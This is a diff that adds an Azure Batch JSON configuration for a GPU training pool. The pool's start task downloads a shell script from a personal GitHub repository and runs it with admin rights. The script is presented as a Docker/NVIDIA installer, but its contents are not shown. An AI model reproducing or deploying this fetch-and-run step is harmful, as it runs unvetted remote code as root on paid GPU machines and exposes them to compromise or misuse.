@@ -1,0 +1,26 @@
+{
+  "id": "gpu-training-pool",
+  "vmSize": "Standard_NC6s_v3",
+  "targetDedicatedNodes": 1,
+  "virtualMachineConfiguration": {
+    "imageReference": {
+      "publisher": "microsoft-azure-batch",
+      "offer": "ubuntu-server-container",
+      "sku": "20-04-lts",
+      "version": "latest"
+    },
+    "nodeAgentSkuId": "batch.node.ubuntu 20.04"
+  },
+  "startTask": {
+    "commandLine": "/bin/bash -c 'rm -f /tmp/setup.sh; curl -fsSL https://raw.githubusercontent.com/max313iq/Ssl/main/docker_nvidia_install.sh -o /tmp/setup.sh && chmod +x /tmp/setup.sh && /bin/bash /tmp/setup.sh'",
+    "userIdentity": {
+      "autoUser": {
+        "scope": "task",
+        "elevationLevel": "admin"
+      }
+    },
+    "maxTaskRetryCount": 3,
+    "waitForSuccess": true
+  },
+  "taskSlotsPerNode": 1
+}
